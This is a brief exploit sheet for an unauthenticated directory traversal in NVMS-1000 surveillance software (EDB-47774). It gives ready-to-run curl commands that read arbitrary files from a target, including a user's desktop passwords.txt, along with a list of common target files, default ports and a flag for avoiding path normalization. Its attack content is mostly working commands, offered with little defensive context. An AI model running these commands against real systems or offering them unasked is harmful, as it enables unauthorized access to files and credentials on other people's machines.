# NVMS-1000 Directory Traversal (EDB-47774)

NVMS-1000 surveillance management software has an unauthenticated directory traversal vulnerability allowing arbitrary file reads.

## Vulnerability
`GET /../../../../../../../../../../../../<path>` reads any file without authentication.

## Exploit (curl)
```bash
curl -s --path-as-is "http://<TARGET>/../../../../../../../../../../../../Windows/win.ini"
curl -s --path-as-is "http://<TARGET>/../../../../../../../../../../../../Users/<username>/Desktop/passwords.txt"
```

## Searchsploit Reference
```
NVMS 1000 - Directory Traversal | exploits/hardware/webapps/47774.txt
```

## Common Targets
```
/Windows/win.ini
/Users/<user>/Desktop/passwords.txt
/Users/<user>/Documents/<file>
/Windows/System32/drivers/etc/hosts
```

## Notes
- Default NVMS port: 80 or 8080
- No authentication required
- Use `--path-as-is` with curl to prevent path normalization
